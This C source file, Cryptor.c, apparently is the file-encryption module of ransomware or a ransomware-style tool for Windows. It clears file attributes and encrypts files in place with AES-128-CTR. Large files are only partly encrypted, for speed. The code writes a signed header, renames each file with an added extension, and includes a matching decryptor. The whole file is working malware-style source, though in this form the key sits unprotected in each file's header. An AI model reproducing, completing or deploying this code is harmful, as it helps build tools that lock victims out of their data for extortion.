// Cryptor.c
#include <windows.h>
#include <immintrin.h>
#include "Common.h"
#include "Queue.h"
#include "Debug.h"
#include "Aes128Ctr.h"
#include "Cryptor.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define LARGE_FILE_SIZE         0x6400000 // 100MB
#define MEDIUM_FILE_SIZE        (LARGE_FILE_SIZE >> 1) 
#define AES_KEY_SIZE            16
#define AES_IV_SIZE             16
#define IO_BUFFER_SIZE          (1024 * 1024)

// Magic bytes stored in ENC_FILE_HEADER.Signature
#define ENC_FILE_SIGNATURE      0x54524357

// Encryption flags stored in ENC_FILE_HEADER.dwFlags
#define ENC_FLAG_PARTIAL        0x00000001  // only first 10MB encrypted

// Partial encryption cap for large files (10MB)
#define PARTIAL_ENC_CAP         (10 * 1024 * 1024)

typedef struct _ENC_FILE_HEADER {
    DWORD Signature;
    DWORD dwFlags;
    BYTE  AesKey[AES_KEY_SIZE];
    BYTE  AesIV[AES_IV_SIZE];
} ENC_FILE_HEADER, * PENC_FILE_HEADER;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BYTE GenRandomByte(void)
{
    unsigned short usRndValue = 0x00;

    for (INT j = 0; j < 0x0A; j++)
    {
        if (_rdrand16_step(&usRndValue))
            return (BYTE)(usRndValue & 0xFF);
        _mm_pause();
    }
    return (BYTE)0x00;
}

VOID GenRandomBytes(IN OUT PBYTE buffer, IN DWORD length)
{
    if (!buffer || length == 0)
        return;

    for (DWORD idx = 0; idx < length; ++idx)
    {
        buffer[idx] = GenRandomByte();
    }
}

static VOID InstallEncFileHeader(IN OUT ENC_FILE_HEADER* pHeader, IN ULONGLONG qwFileSize)
{
    pHeader->Signature = ENC_FILE_SIGNATURE;
    pHeader->dwFlags = (qwFileSize >= LARGE_FILE_SIZE) ? ENC_FLAG_PARTIAL : 0;
    GenRandomBytes(pHeader->AesKey, AES_KEY_SIZE);
    GenRandomBytes(pHeader->AesIV, AES_IV_SIZE);
}

static BOOL ShouldEncryptChunk(IN ULONGLONG qwOffset, IN ULONGLONG qwFileSize, IN DWORD dwFlags)
{
    // Partial encryption: only the first 10MB is encrypted
    if (dwFlags & ENC_FLAG_PARTIAL)
        return qwOffset < PARTIAL_ENC_CAP;

    // Full encryption logic for small/medium files
    if (qwFileSize < MEDIUM_FILE_SIZE)
        return TRUE;

    if (qwFileSize < LARGE_FILE_SIZE)
        return (qwOffset / IO_BUFFER_SIZE) % 2 == 0;

    // Should not reach here for fully encrypted files
    return TRUE;
}


BOOL EncryptSingleFileW(IN CONST PWSTR wOriginalPath)
{
    THREAD BYTE     FileIoBuffer[IO_BUFFER_SIZE];
    WCHAR           wEncryptedPath[MAX_PATH];
    HANDLE          hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER   FileSize = { 0 };
    LARGE_INTEGER   NewFileSize = { 0 };
    LARGE_INTEGER   Offset = { 0 };
    LARGE_INTEGER   ReadPos = { 0 };
    LARGE_INTEGER   WritePos = { 0 };
    DWORD           cbRead = 0;
    DWORD           cbWritten = 0;
    ENC_FILE_HEADER HEADER = { 0 };
    BOOL            bSuccess = FALSE;

    SetFileAttributesW(wOriginalPath, FILE_ATTRIBUTE_NORMAL);

    if ((hFile = CreateFileW(wOriginalPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        PRNT_WIN_ERR(CreateFileW);
        return FALSE;  
    }

    if (!GetFileSizeEx(hFile, &FileSize) || FileSize.QuadPart == 0)
    {
        PRNT_WIN_ERR(GetFileSizeEx);
        goto CLEANUP;
    }

    InstallEncFileHeader(&HEADER, (ULONGLONG)FileSize.QuadPart);
    NewFileSize.QuadPart = FileSize.QuadPart + sizeof(ENC_FILE_HEADER);

    if (!SetFilePointerEx(hFile, NewFileSize, NULL, FILE_BEGIN) || !SetEndOfFile(hFile))
    {
        PRNT_WIN_ERR(SetEndOfFile);
        goto CLEANUP;
    }

    Offset.QuadPart = FileSize.QuadPart;

    while (Offset.QuadPart > 0)
    {
        DWORD cbChunk = (Offset.QuadPart >= IO_BUFFER_SIZE)
            ? IO_BUFFER_SIZE
            : (DWORD)Offset.QuadPart;

        ReadPos.QuadPart = Offset.QuadPart - cbChunk;

        if (!SetFilePointerEx(hFile, ReadPos, NULL, FILE_BEGIN))
        {
            PRNT_WIN_ERR(SetFilePointerEx);
            goto CLEANUP;
        }

        if (!ReadFile(hFile, FileIoBuffer, cbChunk, &cbRead, NULL) || cbRead != cbChunk)
        {
            PRNT_WIN_ERR(ReadFile);
            goto CLEANUP;
        }

        if (ShouldEncryptChunk((ULONGLONG)ReadPos.QuadPart, (ULONGLONG)FileSize.QuadPart, HEADER.dwFlags))
        {
            Aes128CtrCrypt(FileIoBuffer, cbRead, HEADER.AesKey, HEADER.AesIV, (ULONGLONG)ReadPos.QuadPart);
        }

        WritePos.QuadPart = ReadPos.QuadPart + sizeof(ENC_FILE_HEADER);

        if (!SetFilePointerEx(hFile, WritePos, NULL, FILE_BEGIN))
        {
            PRNT_WIN_ERR(SetFilePointerEx);
            goto CLEANUP;
        }

        if (!WriteFile(hFile, FileIoBuffer, cbRead, &cbWritten, NULL) || cbWritten != cbRead)
        {
            PRNT_WIN_ERR(WriteFile);
            goto CLEANUP;
        }

        Offset.QuadPart -= cbChunk;
    }

    if (!SetFilePointerEx(hFile, *(LARGE_INTEGER*)&(LARGE_INTEGER) { .QuadPart = 0 }, NULL, FILE_BEGIN))
    {
        PRNT_WIN_ERR(SetFilePointerEx);
        goto CLEANUP;
    }

    if (!WriteFile(hFile, &HEADER, sizeof(HEADER), &cbWritten, NULL) || cbWritten != sizeof(HEADER))
    {
        PRNT_WIN_ERR(WriteFile);
        goto CLEANUP;
    }

    bSuccess = TRUE;

CLEANUP:
    DELETE_HANDLE(hFile);

    if (bSuccess)
    {
        wsprintfW(wEncryptedPath, L"%s%s", wOriginalPath, ENC_FILE_EXTENSION);

        if (MoveFileExW(wOriginalPath, wEncryptedPath, MOVEFILE_REPLACE_EXISTING))
        {
            DbgPrintW(L"[+] ENCRYPTED: %s (Type: %s) \n",
                wEncryptedPath,
                (HEADER.dwFlags & ENC_FLAG_PARTIAL) ? L"Partial" : L"Full");
        }
    }

    return bSuccess;
}

BOOL DecryptSingleFileW(IN CONST PWSTR wEncryptedPath)
{
    THREAD BYTE     FileIoBuffer[IO_BUFFER_SIZE];
    WCHAR           wOriginalPath[MAX_PATH];
    HANDLE          hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER   FileSize = { 0 };
    LARGE_INTEGER   DataSize = { 0 };
    LARGE_INTEGER   ReadPos = { 0 };
    LARGE_INTEGER   WritePos = { 0 };
    LARGE_INTEGER   NewFileSize = { 0 };
    DWORD           cbRead = 0;
    DWORD           cbWritten = 0;
    ENC_FILE_HEADER HEADER = { 0 };
    BOOL            bSuccess = FALSE;

    if ((hFile = CreateFileW(wEncryptedPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        PRNT_WIN_ERR(CreateFileW);
        return FALSE;
    }

    if (!GetFileSizeEx(hFile, &FileSize) || FileSize.QuadPart <= (LONGLONG)sizeof(ENC_FILE_HEADER))
    {
        PRNT_WIN_ERR(GetFileSizeEx);
        goto CLEANUP;
    }

    if (!ReadFile(hFile, &HEADER, sizeof(HEADER), &cbRead, NULL) || cbRead != sizeof(HEADER))
    {
        PRNT_WIN_ERR(ReadFile);
        goto CLEANUP;
    }

    if (HEADER.Signature != ENC_FILE_SIGNATURE)
    {
        goto CLEANUP;
    }

    DataSize.QuadPart = FileSize.QuadPart - sizeof(ENC_FILE_HEADER);
    ReadPos.QuadPart = sizeof(ENC_FILE_HEADER);

    while (ReadPos.QuadPart < FileSize.QuadPart)
    {
        DWORD cbChunk = ((FileSize.QuadPart - ReadPos.QuadPart) >= IO_BUFFER_SIZE)
            ? IO_BUFFER_SIZE
            : (DWORD)(FileSize.QuadPart - ReadPos.QuadPart);

        if (!SetFilePointerEx(hFile, ReadPos, NULL, FILE_BEGIN))
        {
            PRNT_WIN_ERR(SetFilePointerEx);
            goto CLEANUP;
        }

        if (!ReadFile(hFile, FileIoBuffer, cbChunk, &cbRead, NULL) || cbRead != cbChunk)
        {
            PRNT_WIN_ERR(ReadFile);
            goto CLEANUP;
        }

        // Pass dwFlags from header so decrypt mirrors exactly what encrypt did
        if (ShouldEncryptChunk((ULONGLONG)(ReadPos.QuadPart - sizeof(ENC_FILE_HEADER)), (ULONGLONG)DataSize.QuadPart, HEADER.dwFlags))
        {
            Aes128CtrCrypt(FileIoBuffer, cbRead, HEADER.AesKey, HEADER.AesIV, (ULONGLONG)(ReadPos.QuadPart - sizeof(ENC_FILE_HEADER)));
        }

        WritePos.QuadPart = ReadPos.QuadPart - sizeof(ENC_FILE_HEADER);

        if (!SetFilePointerEx(hFile, WritePos, NULL, FILE_BEGIN))
        {
            PRNT_WIN_ERR(SetFilePointerEx);
            goto CLEANUP;
        }

        if (!WriteFile(hFile, FileIoBuffer, cbRead, &cbWritten, NULL) || cbWritten != cbRead)
        {
            PRNT_WIN_ERR(WriteFile);
            goto CLEANUP;
        }

        ReadPos.QuadPart += cbChunk;
    }

    NewFileSize.QuadPart = DataSize.QuadPart;

    if (!SetFilePointerEx(hFile, NewFileSize, NULL, FILE_BEGIN) || !SetEndOfFile(hFile))
    {
        PRNT_WIN_ERR(SetEndOfFile);
        goto CLEANUP;
    }

    bSuccess = TRUE;

CLEANUP:
    DELETE_HANDLE(hFile);

    if (bSuccess)
    {
        INT cchExt = lstrlenW(ENC_FILE_EXTENSION);
        INT cchPath = lstrlenW(wEncryptedPath);

        // Strip the extension by null terminating before it
        lstrcpyW(wOriginalPath, wEncryptedPath);
        wOriginalPath[cchPath - cchExt] = L'\0';

        if (MoveFileExW(wEncryptedPath, wOriginalPath, MOVEFILE_REPLACE_EXISTING))                
                        
        {               
            DbgPrintW(L"[+] DECRYPTED: %s (Type: %s)\n",
                wOriginalPath,
                (HEADER.dwFlags & ENC_FLAG_PARTIAL) ? L"Partial" : L"Full");
        }
    }

    return bSuccess;
}
